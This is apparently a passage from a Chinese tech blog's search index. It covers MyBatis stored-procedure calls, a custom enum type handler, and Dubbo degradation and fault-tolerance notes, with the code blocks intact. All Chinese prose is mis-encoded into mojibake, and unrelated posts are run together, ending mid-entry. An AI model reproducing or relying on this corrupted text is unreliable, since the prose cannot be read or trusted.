EmployeeMapper { public Employee getEmpById(Long id);} åˆ›å»º MySQL å­˜å‚¨è¿‡ç¨‹ 123456delimiter $$create procedure query_single_employee(IN empId long)begin select id, last_name as lastName, gender, email from t_employee where id = empId;end $$delimiter ; SQL æ˜ å°„æ–‡ä»¶ 12345678&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;!-- è°ƒç”¨å­˜å‚¨è¿‡ç¨‹ï¼ˆä¼ å…¥å‚æ•°ï¼‰ --&gt; &lt;select id="getEmpById" parameterType="Long" resultType="com.clay.mybatis.bean.Employee" statementType="CALLABLE"&gt; { call query_single_employee(#{id, mode=IN, jdbcType=BIGINT}) } &lt;/select&gt;&lt;/mapper&gt; ä¸šåŠ¡é€»è¾‘ 1234567891011121314151617181920public class MyBatisApplication { public static void main(String[] args) throws IOException { String resource = "mybatis-config.xml"; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); SqlSession session = sqlSessionFactory.openSession(); try { EmployeeMapper mapper = session.getMapper(EmployeeMapper.class); Employee employee = mapper.getEmpById(1L); System.out.println(employee); } finally { if (session != null) { session.close(); } } }} æ‰§è¡Œç»“æœ 123422:58:51,817 DEBUG getEmpById:137 - ==&gt; Preparing: { call query_single_employee(?) }22:58:51,914 DEBUG getEmpById:137 - ==&gt; Parameters: 1(Long)22:58:51,942 DEBUG getEmpById:137 - &lt;== Total: 122:58:51,942 DEBUG getEmpById:137 - &lt;== Updates: 0 Oracle å­˜å‚¨è¿‡ç¨‹è°ƒç”¨æ¡ˆä¾‹äºŒMyBatis å¯¹å­˜å‚¨è¿‡ç¨‹çš„æ¸¸æ ‡æä¾›äº†ä¸€ä¸ª JdbcType=CURSOR çš„æ”¯æŒï¼Œå¯ä»¥æ™ºèƒ½åœ°é€šè¿‡æ¸¸æ ‡è¯»å–æ•°æ®é›†ï¼Œå¹¶å°†æ•°æ®é›†è‡ªåŠ¨æ˜ å°„åˆ°å£°æ˜çš„ç»“æœé›†ä¸­ã€‚åœ¨ä¸‹é¢çš„æ¡ˆä¾‹ä¸­ï¼Œç®€å•æ¼”ç¤ºäº†å¦‚ä½•åœ¨ Oracle æ•°æ®åº“ä¸­ä½¿ç”¨å­˜å‚¨è¿‡ç¨‹æ¥å®ç°åˆ†é¡µæŸ¥è¯¢çš„é€»è¾‘ï¼ˆè¿™é‡Œåªæ˜¯ç®€å•æ¼”ç¤ºï¼Œå¹¶æœªå®Œå…¨çœŸæ­£å®ç°åˆ†é¡µæŸ¥è¯¢çš„é€»è¾‘ï¼‰ã€‚ JavaBean ç±» 12345678public class Employee { private Long id; private String lastName; private String gender; private String email;} 12345678public class PageEmp { private int start; private int end; private int count; private List&lt;Employee&gt; emps;} Mapper æ¥å£ 1234public interface EmployeeMapper { public void getPageByProcedure(PageEmp page);} åˆ›å»º Oracle å­˜å‚¨è¿‡ç¨‹ 12345678910111213create or replace procedurepage_emp ( p_start in int, p_end in int, p_count out int, ref_cur out sys_refcursor) ASBEGIN select count(*) into p_count from t_employee; open ref_cur for select * from (select e.*, rownum as r1 from t_employee e where rownum &lt; p_end) where r1 &gt; p_start;END page_emp; SQL æ˜ å°„æ–‡ä»¶ 12345678910111213141516171819202122&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;resultMap id="EmpResultMap" type="com.clay.mybatis.bean.Employee"&gt; &lt;id column="id" property="id"/&gt; &lt;result column="last_name" property="lastName"/&gt; &lt;result column="gender" property="gender"/&gt; &lt;result column="email" property="email"/&gt; &lt;/resultMap&gt; &lt;!-- è°ƒç”¨å­˜å‚¨è¿‡ç¨‹ï¼Œé€šè¿‡æ¸¸æ ‡è¯»å–è¿”å›çš„æ•°æ®é›†ï¼Œå¹¶å°†æ•°æ®é›†è‡ªåŠ¨æ˜ å°„åˆ°å£°æ˜çš„ç»“æœé›†ä¸­ --&gt; &lt;select id="getPageByProcedure" parameterType="com.clay.mybatis.bean.PageEmp" statementType="CALLABLE" databaseId="oracle"&gt; { call page_emp ( #{start, mode=IN, jdbcType=INTEGER}, #{end, mode=IN, jdbcType=INTEGER}, #{count, mode=OUT, jdbcType=INTEGER}, #{emps, mode=OUT, jdbcType=CURSOR, javaType=ResultSet, resultMap=EmpResultMap} ) } &lt;/select&gt;&lt;/mapper&gt; MyBatis å…¨å±€é…ç½®æ–‡ä»¶ 12345&lt;!-- æ•°æ®åº“å‚å•†æ ‡è¯† --&gt;&lt;databaseIdProvider type="DB_VENDOR"&gt; &lt;property name="MySQL" value="mysql"/&gt; &lt;property name="Oracle" value="oracle"/&gt;&lt;/databaseIdProvider&gt; ä¸šåŠ¡é€»è¾‘ 12345678910111213141516171819202122public class MyBatisApplication { public static void main(String[] args) throws IOException { SqlSessionFactory sqlSessionFactory = getSqlSessionFactory(); SqlSession session = sqlSessionFactory.openSession(); try { EmployeeMapper mapper = session.getMapper(EmployeeMapper.class); PageEmp page = new PageEmp(); page.setStart(1); page.setEnd(5); mapper.getPageByProcedure(page); System.out.println("æ€»è®°å½•æ•°ï¼š" + page.getCount()); System.out.println("æŸ¥å‡ºçš„æ•°æ®ï¼š" + page.getEmps()); } finally { if (session != null) { session.close(); } } }} MyBatis æšä¸¾ç±»å‹å¤„ç†å™¨é»˜è®¤çš„æšä¸¾å¤„ç†å™¨MyBatis åœ¨å¤„ç†æšä¸¾ç±»å‹å¯¹è±¡çš„æ—¶å€™ï¼Œé»˜è®¤æ˜¯ä½¿ç”¨ EnumTypeHandler æšä¸¾ç±»å‹å¤„ç†å™¨å°†æšä¸¾çš„åç§°ä¿å­˜åˆ°æ•°æ®åº“ã€‚è‹¥å¸Œæœ›å°†æšä¸¾ç±»å‹çš„ç´¢å¼•å€¼ä¿å­˜åˆ°æ•°æ®åº“ï¼Œåˆ™åªéœ€è¦åœ¨ MyBatis çš„å…¨å±€é…ç½®æ–‡ä»¶ä¸­æŒ‡å®šä½¿ç”¨ EnumOrdinalTypeHandler æšä¸¾ç±»å‹å¤„ç†å™¨å³å¯ï¼Œé…ç½®ç¤ºä¾‹å¦‚ä¸‹ï¼š 12345678&lt;configuration&gt; &lt;typeHandlers&gt; &lt;!-- è®© MyBatis ä½¿ç”¨ EnumOrdinalTypeHandler å¤„ç†å™¨æ¥å¤„ç† AdminStatus æšä¸¾ç±»å‹ --&gt; &lt;typeHandler handler="org.apache.ibatis.type.EnumOrdinalTypeHandler" javaType="com.clay.mybatis.enums.AdminStatus"/&gt; &lt;/typeHandlers&gt;&lt;/configuration&gt; è‡ªå®šä¹‰æšä¸¾ç±»å‹å¤„ç†å™¨çš„æ­¥éª¤è‡ªå®šä¹‰æšä¸¾ç±»å‹å¤„ç†å™¨çš„æ­¥éª¤å¦‚ä¸‹: 1ã€å®ç° TypeHandler æ¥å£æˆ–è€…ç»§æ‰¿ BaseTypeHandler ç±» 2ã€ä½¿ç”¨ @MappedType æ³¨è§£å®šä¹‰è¦å¤„ç†çš„ javaType ç±»å‹ï¼Œä½¿ç”¨ @MappedJdbcTypes æ³¨è§£å®šä¹‰è¦å¤„ç†çš„ jdbcType ç±»å‹ï¼Œè¿™ä¸€æ­¥éª¤å¯é€‰ 3ã€é€šè¿‡ä»¥ä¸‹ä¸‰ç§æ–¹å¼çš„ä»»æ„ä¸€ç§æ¥ä½¿ç”¨è‡ªå®šä¹‰çš„ç±»å‹å¤„ç†å™¨ åœ¨å‚æ•°å¤„ç†çš„æ—¶å€™ï¼Œå£°æ˜è¦ä½¿ç”¨è‡ªå®šä¹‰çš„ TypeHandler è¿›è¡Œå¤„ç†ï¼Œä¾‹å¦‚ï¼š #{status, typeHandler=xxxx} åœ¨ MyBatis çš„å…¨å±€é…ç½®æ–‡ä»¶ä¸­ï¼ŒæŒ‡å®š TypeHandler è¦å¤„ç†çš„ javaType ç±»å‹ï¼Œä¾‹å¦‚ï¼š&lt;typeHandlers&gt; &lt;typeHandler handler="xxxx" javaType="xxxx"/&gt; &lt;/typeHandlers&gt; åœ¨å®šä¹‰ç»“æœé›†æ ‡ç­¾çš„æ—¶å€™ï¼Œå£°æ˜è¦ä½¿ç”¨è‡ªå®šä¹‰çš„ TypeHandler å¤„ç†å‚æ•°çš„å°è£…ï¼Œä¾‹å¦‚ï¼š&lt;resultMap&gt; &lt;result column="status" property="status" typeHandler="xxxx"&gt; &lt;/result&gt; &lt;/resultMap&gt; è‡ªå®šä¹‰æšä¸¾ç±»å‹å¤„ç†å™¨çš„æ¡ˆä¾‹æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-lesson-24ã€‚ åˆ›å»ºæ•°æ®åº“è¡¨ 1234567CREATE TABLE `t_admin` ( `id` int(11) NOT NULL AUTO_INCREMENT, `name` varchar(255) DEFAULT NULL, `email` varchar(255) DEFAULT NULL, `status` int DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8; JavaBean ç±» 12345678public class Admin { private Long id; private String name; private String email; private AdminStatus status;} æšä¸¾ç±» 1234567891011121314151617181920/** * æšä¸¾æ¥å£ */public interface BaseEnum&lt;E extends Enum&lt;?&gt;, T&gt; { /** * è·å–æšä¸¾å€¼ * * @return æšä¸¾å€¼ */ T getValue(); /** * è·å–æšä¸¾å€¼æè¿° * * @return æšä¸¾å€¼çš„æè¿° */ String getDescription();} 123456789101112131415161718192021222324252627/** * æšä¸¾å®ç°ç±» */public enum AdminStatus implements BaseEnum&lt;AdminStatus, Integer&gt; { VALID(1, "æœ‰æ•ˆ"), INVALID(0, "æ— æ•ˆ"); private final Integer value; private final String description; @Override public Integer getValue() { return this.value; } @Override public String getDescription() { return this.description; } private AdminStatus(Integer value, String description) { this.value = value; this.description = description; }} æšä¸¾ç±»å‹å¤„ç†å™¨ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576import org.apache.ibatis.type.BaseTypeHandler;import org.apache.ibatis.type.JdbcType;import com.clay.mybatis.enums.BaseEnum;import java.sql.CallableStatement;import java.sql.PreparedStatement;import java.sql.ResultSet;import java.sql.SQLException;import java.util.Objects;/** * æšä¸¾ç±»å‹å¤„ç†ç±» */public class AutoGenericEnumTypeHandler&lt;E extends BaseEnum&lt;?, ?&gt;&gt; extends BaseTypeHandler&lt;E&gt; { private Class&lt;E&gt; enumType; private E[] enums; public AutoGenericEnumTypeHandler() { } public AutoGenericEnumTypeHandler(Class&lt;E&gt; type) { if (Objects.isNull(type)) { throw new IllegalArgumentException("Type argument cannot be null"); } this.enumType = type; this.enums = type.getEnumConstants(); if (Objects.isNull(this.enums)) { throw new IllegalArgumentException(type.getName() + " does not represent an enum type"); } } private E loadEnum(Object index) { for (E e : enums) { if (e.getValue().toString().equals(index.toString())) { return e; } } throw new IllegalArgumentException(enumType.getName() + " unknown enumerated type index : " + index); } @Override public void setNonNullParameter(PreparedStatement ps, int i, E parameter, JdbcType jdbcType) throws SQLException { ps.setObject(i, parameter.getValue()); } @Override public E getNullableResult(ResultSet rs, String columnName) throws SQLException { if (Objects.isNull(rs.getObject(columnName))) { return null; } Object index = rs.getObject(columnName); return loadEnum(index); } @Override public E getNullableResult(ResultSet rs, int columnIndex) throws SQLException { if (Objects.isNull(rs.getObject(columnIndex))) { return null; } Object index = rs.getObject(columnIndex); return loadEnum(index); } @Override public E getNullableResult(CallableStatement cs, int columnIndex) throws SQLException { if (Objects.isNull(cs.getObject(columnIndex))) { return null; } Object index = cs.getObject(columnIndex); return loadEnum(index); }} Mapper æ¥å£ 123456public interface AdminMapper { public Admin getAdminById(Long id); public boolean addAdmin(Admin admin);} SQL æ˜ å°„æ–‡ä»¶ 1234567891011121314&lt;mapper namespace="com.clay.mybatis.dao.AdminMapper"&gt; &lt;select id="getAdminById" parameterType="Long" resultType="com.clay.mybatis.bean.Admin"&gt; select id, name, email, status from t_admin where id = #{id} &lt;/select&gt; &lt;insert id="addAdmin" parameterType="com.clay.mybatis.bean.Admin" useGeneratedKeys="true" keyProperty="id"&gt; insert into t_admin (name, email, status) values(#{name}, #{email}, #{status}) &lt;/insert&gt;&lt;/mapper&gt; MyBatis çš„å…¨å±€é…ç½®æ–‡ä»¶ 12345678&lt;configuration&gt; &lt;typeHandlers&gt; &lt;!-- è®© MyBatis ä½¿ç”¨ AutoGenericEnumTypeHandler å¤„ç†å™¨æ¥å¤„ç† AdminStatus æšä¸¾ç±»å‹ --&gt; &lt;typeHandler handler="com.clay.mybatis.handler.AutoGenericEnumTypeHandler" javaType="com.clay.mybatis.enums.AdminStatus" /&gt; &lt;/typeHandlers&gt;&lt;/configuration&gt; ä¸šåŠ¡ä»£ç  123456789101112131415161718192021222324252627public class MyBatisApplication { public static void main(String[] args) throws IOException { String resource = "mybatis-config.xml"; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); SqlSession session = sqlSessionFactory.openSession(); try { AdminMapper mapper = session.getMapper(AdminMapper.class); Admin entity = new Admin("admin", "admin@gmail.com", AdminStatus.VALID); mapper.addAdmin(entity); Admin admin = mapper.getAdminById(1L); System.out.println(admin); session.commit(); } finally { if (session != null) { session.close(); } } }} æ‰§è¡Œç»“æœ 123456721:36:08,853 DEBUG addAdmin:137 - ==&gt; Preparing: insert into t_admin (name, email, status) values(?, ?, ?)21:36:08,892 DEBUG addAdmin:137 - ==&gt; Parameters: admin(String), admin@gmail.com(String), 1(Integer)21:36:08,893 DEBUG addAdmin:137 - &lt;== Updates: 121:36:08,909 DEBUG getAdminById:137 - ==&gt; Preparing: select id, name, email, status from t_admin where id = ?21:36:08,910 DEBUG getAdminById:137 - ==&gt; Parameters: 1(Long)21:36:08,927 DEBUG getAdminById:137 - &lt;== Total: 1Admin [id=1, name=admin, email=admin@gmail.com, status=VALID] è§‚å¯Ÿä¸Šé¢çš„æ‰§è¡Œç»“æœï¼Œå¯ä»¥å‘ç° MyBatis ä¼šè‡ªåŠ¨å°†æšä¸¾ç±»å‹çš„ value å±æ€§ä¿å­˜åˆ°æ•°æ®åº“ä¸­ï¼Œè€Œä¸æ˜¯ä¿å­˜æšä¸¾ç±»å‹çš„åç§°æˆ–è€…ç´¢å¼•å€¼ï¼ŒåŒæ—¶æŸ¥è¯¢æ•°æ®åä¹Ÿä¼šè‡ªåŠ¨å°è£…æšä¸¾ç±»å‹çš„æ•°æ®ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java æ•°æ®åº“"},{title:"Kafka çŸ¥è¯†å›¾è°± (æœ€æ–°)",url:"/posts/ac64f898.html",text:'Kafka å­¦ä¹ è·¯çº¿åŸºç¡€çŸ¥è¯† ç³»ç»Ÿé›†æˆ ç”Ÿäº§è°ƒä¼˜ æºç è§£æ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"çŸ¥è¯†å›¾è°±"},{title:"å‰ç«¯å¼€å‘çŸ¥è¯†å›¾è°± (æœ€æ–°)",url:"/posts/3d316a65.html",text:'åŸºç¡€çŸ¥è¯† æœåŠ¡ä¸é€šä¿¡ å­˜å‚¨ã€å·¥ä½œä¸ååŠ© ä¼ä¸šå¼€å‘åŸºç¡€ Web å…¨æ ˆå¼€å‘ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"çŸ¥è¯†å›¾è°±"},{title:"Dubbo ä¹‹å›› Dubbo å¼€å‘éšç¬”",url:"/posts/c944ed24.html",text:'SpringBoot-2.1.0+ æ•´åˆ Apache Dubbo-2.7.0ï¼Œå¯åŠ¨åº”ç”¨åæç¤ºéœ€è¦æ·»åŠ  SpringBoot é…ç½® â€œspring.main.allow-bean-definition-overriding=trueâ€ å¼‚å¸¸æ—¥å¿—ï¼š 1234567891011***************************APPLICATION FAILED TO START***************************Description:The bean \'dubboConfigConfiguration.Single\', defined in null, could not be registered. A bean with that name has already been defined in null and overriding is disabled.Action:Consider renaming one of the beans or enabling overriding by setting spring.main.allow-bean-definition-overriding=true å¼‚å¸¸åˆ†æï¼š 123é—®é¢˜æ˜¯ç”±æ³¨è§£ @EnableDubboã€@EnableDubboConfig çš„ä½¿ç”¨æ‰€å¯¼è‡´ï¼Œå…·ä½“å¯å‚è€ƒä»¥ä¸‹èµ„æ–™ï¼šhttps://github.com/apache/dubbo/issues/3193https://github.com/apache/dubbo-spring-boot-project/issues/476 è§£å†³æ–¹æ³•ï¼š 12345æ–¹æ³•ä¸€ï¼šå¾€SpringBootçš„é…ç½®æ–‡ä»¶ï¼ˆapplication.propertiesï¼‰ä¸­æ·»åŠ å¯¹åº”é…ç½®ï¼Œå…è®¸åœ¨Springå®¹å™¨å†…å¯ä»¥è¦†ç›–Beançš„å®šä¹‰ï¼š spring.main.allow-bean-definition-overriding=trueæ–¹æ³•äºŒï¼šå°†Apache Dubbo-2.7.0 å‡çº§åˆ° Apache Dubbo-2.7.1ç‰ˆæœ¬ï¼Œå…·ä½“å¯å‚è€ƒï¼šhttps://github.com/apache/dubbo-spring-boot-project/issues/467 å®•æœºç¯å¢ƒä¸‹ Dubbo çš„å¥å£®æ€§ä¸é«˜å¯ç”¨æ€§ä»‹ç» ç›‘æ§ä¸­å¿ƒå®•æ‰ä¸å½±å“ä½¿ç”¨ï¼Œåªæ˜¯ä¸¢å¤±éƒ¨åˆ†é‡‡æ ·æ•°æ® æ•°æ®åº“å®•æ‰åï¼Œæ³¨å†Œä¸­å¿ƒä»èƒ½é€šè¿‡ç¼“å­˜æä¾›æœåŠ¡åˆ—è¡¨æŸ¥è¯¢ï¼Œä½†ä¸èƒ½æ³¨å†Œæ–°æœåŠ¡ æ³¨å†Œä¸­å¿ƒå¯¹ç­‰é›†ç¾¤ï¼Œä»»æ„ä¸€å°å®•æ‰åï¼Œå°†è‡ªåŠ¨åˆ‡æ¢åˆ°å¦ä¸€å° æ³¨å†Œä¸­å¿ƒå…¨éƒ¨å®•æ‰åï¼ŒæœåŠ¡æä¾›è€…å’ŒæœåŠ¡æ¶ˆè´¹è€…ä»èƒ½é€šè¿‡æœ¬åœ°ç¼“å­˜é€šè®¯ æœåŠ¡æä¾›è€…æ— çŠ¶æ€ï¼Œä»»æ„ä¸€å°å®•æ‰åï¼Œä¸å½±å“ä½¿ç”¨ æœåŠ¡æä¾›è€…å…¨éƒ¨å®•æ‰åï¼ŒæœåŠ¡æ¶ˆè´¹è€…åº”ç”¨å°†æ— æ³•ä½¿ç”¨ï¼Œå¹¶æ— é™æ¬¡é‡è¿ç­‰å¾…æœåŠ¡æä¾›è€…æ¢å¤ Dubbo æœåŠ¡é™çº§ å½“æœåŠ¡å™¨å‹åŠ›å‰§å¢çš„æƒ…å†µä¸‹ï¼Œæ ¹æ®å®é™…ä¸šåŠ¡æƒ…å†µåŠæµé‡ï¼Œå¯¹ä¸€äº›æœåŠ¡å’Œé¡µé¢æœ‰ç­–ç•¥çš„ä¸å¤„ç†æˆ–æ¢ç§ç®€å•çš„æ–¹å¼å¤„ç†ï¼Œä»è€Œé‡Šæ”¾æœåŠ¡å™¨èµ„æºä»¥ä¿è¯æ ¸å¿ƒäº¤æ˜“æ­£å¸¸è¿ä½œæˆ–é«˜æ•ˆè¿ä½œã€‚Dubbo å¯ä»¥é€šè¿‡æœåŠ¡é™çº§åŠŸèƒ½ä¸´æ—¶å±è”½æŸä¸ªå‡ºé”™çš„éå…³é”®æœåŠ¡ï¼Œå¹¶å®šä¹‰é™çº§åçš„è¿”å›ç­–ç•¥ã€‚Dubbo å‘æ³¨å†Œä¸­å¿ƒå†™å…¥åŠ¨æ€é…ç½®è¦†ç›–è§„åˆ™å¦‚ä¸‹ï¼š 123RegistryFactory registryFactory = ExtensionLoader.getExtensionLoader(RegistryFactory.class).getAdaptiveExtension();Registry registry = registryFactory.getRegistry(URL.valueOf("zookeeper://10.20.153.10:2181"));registry.register(URL.valueOf("override://0.0.0.0/com.foo.BarService?category=configurators&amp;dynamic=false&amp;application=foo&amp;mock=force:return+null")); å…¶ä¸­ï¼š mock=force:return+null è¡¨ç¤ºæ¶ˆè´¹æ–¹å¯¹è¯¥æœåŠ¡çš„æ–¹æ³•è°ƒç”¨éƒ½ç›´æ¥è¿”å› null å€¼ï¼Œä¸å‘èµ·è¿œç¨‹è°ƒç”¨ã€‚ç”¨æ¥å±è”½ä¸é‡è¦æœåŠ¡ä¸å¯ç”¨æ—¶å¯¹è°ƒç”¨æ–¹çš„å½±å“ã€‚ è¿˜å¯ä»¥æ”¹ä¸º mock=fail:return+null è¡¨ç¤ºæ¶ˆè´¹æ–¹å¯¹è¯¥æœåŠ¡çš„æ–¹æ³•è°ƒç”¨åœ¨å¤±è´¥åï¼Œå†è¿”å› null å€¼ï¼Œä¸æŠ›å¼‚å¸¸ã€‚ç”¨æ¥å®¹å¿ä¸é‡è¦æœåŠ¡ä¸ç¨³å®šæ—¶å¯¹è°ƒç”¨æ–¹çš„å½±å“ã€‚ åˆ©ç”¨ Dubbo-Admin çš„ UI ç•Œé¢ï¼ˆæ—§ç‰ˆï¼‰ï¼Œå¯ä»¥æ–¹ä¾¿åœ°å¯¹æœåŠ¡è¿›è¡Œå±è”½ / æ¢å¤ï¼ˆmock=force:return+nullï¼‰ã€å®¹é”™ / æ¢å¤ï¼ˆmock=fail:return+nullï¼‰å¤„ç†ï¼Œå³ä¸Šé¢æåˆ°çš„ä¸¤ç§æœåŠ¡é™çº§æ–¹å¼ Dubbo é›†ç¾¤å®¹é”™ åœ¨é›†ç¾¤è°ƒç”¨å¤±è´¥æ—¶ï¼ŒDubbo æä¾›äº†å¤šç§å®¹é”™æ–¹æ¡ˆï¼Œç¼ºçœä¸º failover é‡è¯•ã€‚çœŸæ­£çš„ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œä¸€èˆ¬ä½¿ç”¨ Hystrix è¿›è¡Œå®¹é”™å¤„ç†ã€‚ Failover Clusterï¼šå¤±è´¥è‡ªåŠ¨åˆ‡æ¢ï¼Œå½“å‡ºç°å¤±è´¥ï¼Œé‡è¯•å…¶å®ƒæœåŠ¡å™¨ã€‚é€šå¸¸ç”¨äºè¯»æ“ä½œï¼Œä½†é‡è¯•ä¼šå¸¦æ¥æ›´é•¿å»¶è¿Ÿã€‚å¯é€šè¿‡ retries=â€2â€ æ¥è®¾ç½®é‡è¯•æ¬¡æ•° (ä¸å«ç¬¬ä¸€æ¬¡)ã€‚ Failfast Clusterï¼šå¿«é€Ÿå¤±è´¥ï¼Œåªå‘èµ·ä¸€æ¬¡è°ƒç”¨ï¼Œå¤±è´¥ç«‹å³æŠ¥é”™ã€‚é€šå¸¸ç”¨äºéå¹‚ç­‰æ€§çš„å†™æ“ä½œï¼Œæ¯”å¦‚æ–°å¢è®°å½•ã€‚ Failsafe Clusterï¼šå¤±è´¥å®‰å…¨ï¼Œå‡ºç°å¼‚å¸¸æ—¶ï¼Œç›´æ¥å¿½ç•¥ã€‚é€šå¸¸ç”¨äºå†™å…¥å®¡è®¡æ—¥å¿—ç­‰æ“ä½œã€‚ Failback Clusterï¼šå¤±è´¥è‡ªåŠ¨æ¢å¤ï¼Œåå°è®°å½•å¤±è´¥è¯·æ±‚ï¼Œå®šæ—¶é‡å‘ã€‚é€šå¸¸ç”¨äºæ¶ˆæ¯é€šçŸ¥æ“ä½œã€‚ Forking Clusterï¼šå¹¶è¡Œè°ƒç”¨å¤šä¸ªæœåŠ¡å™¨ï¼Œåªè¦ä¸€ä¸ªæˆåŠŸå³è¿”å›ã€‚é€šå¸¸ç”¨äºå®æ—¶æ€§è¦æ±‚è¾ƒé«˜çš„è¯»æ“ä½œï¼Œä½†éœ€è¦æµªè´¹æ›´å¤šæœåŠ¡èµ„æºã€‚å¯é€šè¿‡ forks=â€2â€ æ¥è®¾ç½®æœ€å¤§å¹¶è¡Œæ•°ã€‚ Broadcast Clusterï¼šå¹¿æ’­è°ƒç”¨æ‰€æœ‰æä¾›è€…ï¼Œé€ä¸ªè°ƒç”¨ï¼Œä»»æ„ä¸€å°æŠ¥é”™åˆ™æŠ¥é”™ã€‚é€šå¸¸ç”¨äºé€šçŸ¥æ‰€æœ‰æä¾›è€…æ›´æ–°ç¼“å­˜æˆ–æ—¥å¿—ç­‰æœ¬åœ°èµ„æºä¿¡æ¯ã€‚ 1234Failover é‡è¯•æ¬¡æ•°çš„å‡ ç§é…ç½®æ–¹å¼å¦‚ä¸‹ï¼š&lt;dubbo:service retries="2" /&gt;&lt;dubbo:reference retries="2" /&gt;&lt;dubbo:reference&gt; &lt;dubbo:method name="findFoo" retries="2" /&gt; &lt;/dubbo:reference&gt; 123é›†ç¾¤æ¨¡å¼é…ç½®ï¼ŒæŒ‰ç…§ä»¥ä¸‹å‡ ç§é…ç½®æ–¹å¼åœ¨æœåŠ¡æä¾›æ–¹å’Œæ¶ˆè´¹æ–¹é…ç½®é›†ç¾¤æ¨¡å¼ï¼š&lt;dubbo:service cluster="failsafe" /&gt;&lt;dubbo:reference cluster="failsafe" /&gt; Spring ä¸ SpringBoot æ•´åˆ Dubbo æ•´åˆ Dubbo çš„ä¸‰ç§æ–¹å¼ ä¸‰ç§æ–¹å¼åˆ†åˆ«ä¸ºï¼šXML é…ç½®ã€Annotation é…ç½®ã€API é…ç½® Spring ä¸ SpringBoot éƒ½æ”¯æŒä»¥ XML é…ç½®ã€Annotation é…ç½®æ•´åˆ Dubbo ç”±äºä½¿ç”¨åŸºäºæ³¨è§£çš„æ–¹å¼æ•´åˆ Dubboï¼Œæ— æ³•å®ç° Dubbo æ–¹æ³•çº§çš„é…ç½®ï¼ˆå³ dubbo:method æ ‡ç­¾çš„åŠŸèƒ½ï¼‰ï¼Œå¦‚æœ Springã€SpringBoot éœ€è¦ç”¨åˆ° Dubbo æ–¹æ³•çº§çš„é…ç½®ï¼Œé‚£ä¹ˆåˆ™éœ€è¦ä½¿ç”¨ XML çš„æ–¹å¼æ•´åˆ Dubbo Spring ä¸ SpringBoot æ•´åˆ Dubbo ç®€å•æ€»ç»“ SpringBoot + XMLï¼š @ImportResource SpringBoot + Annotationï¼š @EnableDubbo Spring + Annotationï¼š AnnotationConfigApplicationContext Spring + XMLï¼š ClassPathXmlApplicationContextã€FileSystemXmlApplicationContext Dubbo æºç åˆ†æ 1.Dubbo æ¡†æ¶è®¾è®¡ä»‹ç» 2.XML æ ‡ç­¾è§£æç±»ï¼šDubboNamespaceHandlerã€DubboBeanDefinitionParser 3.Dubbo é…ç½®ç±»ä¹‹é—´çš„å…³ç³» 4.Dubbo çš„æœåŠ¡æš´éœ² 5.Dubbo çš„æœåŠ¡å¼•ç”¨ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"åˆ†å¸ƒå¼ å¼€å‘éšç¬”"},{title:"ZooKeeper å¼€å‘éšç¬”",url:"/posts/7053c1b0.html",text:'Dubbo ä½¿ç”¨ Curator è¿æ¥ ZooKeeper å¤±è´¥å¼‚å¸¸æ—¥å¿—ï¼š 1Caused by: org.apache.zookeeper.KeeperException$UnimplementedException: KeeperErrorCode = Unimplemented for /dubbo/xxx.xxx.service.UserService/providers/dubbo .... 